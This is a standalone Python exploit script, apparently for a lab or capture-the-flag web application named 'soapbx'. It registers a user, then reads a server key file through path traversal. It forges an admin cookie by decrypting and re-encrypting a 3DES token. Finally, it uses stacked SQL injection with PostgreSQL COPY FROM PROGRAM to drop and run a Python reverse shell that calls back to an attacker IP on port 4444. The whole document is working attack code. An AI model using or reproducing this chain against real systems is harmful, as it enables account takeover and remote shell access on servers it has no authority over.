import requests,time,string,subprocess,base64,random,re,sys,hashlib,pyDes

target = sys.argv[1] # Target URL in http://10.10.10.10
attacker_ip = sys.argv[2] # Attacker IP, port 4444


username = ''.join(random.choice(string.ascii_lowercase) for c in range(3)) # random username
mein_email = username+'@soapbx.local'

# Get the encryption key from email
def generate_key(email, salt):
	keytext = salt + email
	return hashlib.sha256(keytext.encode('utf-8')).digest()[:24]

# Get the 3DES decrypted token from 'user.ABCDEFXYZ'
def get_raw_token(cookie, user_email, instance_id):
	cookie_val = base64.urlsafe_b64decode(cookie.split(".")[1])
	key = generate_key(user_email, instance_id)
	des = pyDes.triple_des(key=key, pad=None, mode=pyDes.ECB, padmode=pyDes.PAD_PKCS5)
	return des.decrypt(data=cookie_val)

# Return a forged cookie from a token in memory
def generate_cookie(user_id, user_name, user_email, token, instance_id):
	data = f'{token}|{user_id}'
	key = generate_key(user_email, instance_id)
	des = pyDes.triple_des(key=key, pad=None, mode=pyDes.ECB, padmode=pyDes.PAD_PKCS5)
	encrypt_byte = des.encrypt(data=data.encode('utf-8'))
	return user_name + '.' + base64.urlsafe_b64encode(encrypt_byte).decode('utf-8')

# Initialization
session = requests.Session()
session.get(target+'/')

# Create account
session.post(target+'/signup', data={'submit':'Submit','email':mein_email,'password':'P@55w0rd123','username':username})

# Log in
session.post(target+'/login',  data={'submit':'Submit','username':username,'password':'P@55w0rd123','rememberme':True})
mein_token = session.cookies.get_dict()["rememberme"]

# Download encryption key
uuid = session.get(target+'/download?id=..././conf/instanceid').text

# Transform user to admin token
decoded_token = get_raw_token(mein_token, mein_email, uuid).decode('utf-8').split('|')[0]
admincookie = generate_cookie(1, 'admin', 'admin@soapbx.local', decoded_token, uuid)

# Log in as admin
session.get(target+'/login', cookies={'rememberme': admincookie})

# PostGreSQL RCE from swisskeyrepo
b64payload = base64.b64encode(f'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{attacker_ip}",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'.encode('utf-8'))
session.get(target+"/admin/users/category?id=1; COPY(SELECT convert_from(decode('"+b64payload.decode('utf-8')+"','base64'),'utf-8')) to '/tmp/shell.py';DROP TABLE IF EXISTS cmd_exec;CREATE TABLE cmd_exec(cmd_output text);COPY cmd_exec FROM PROGRAM 'python3 /tmp/shell.py';")
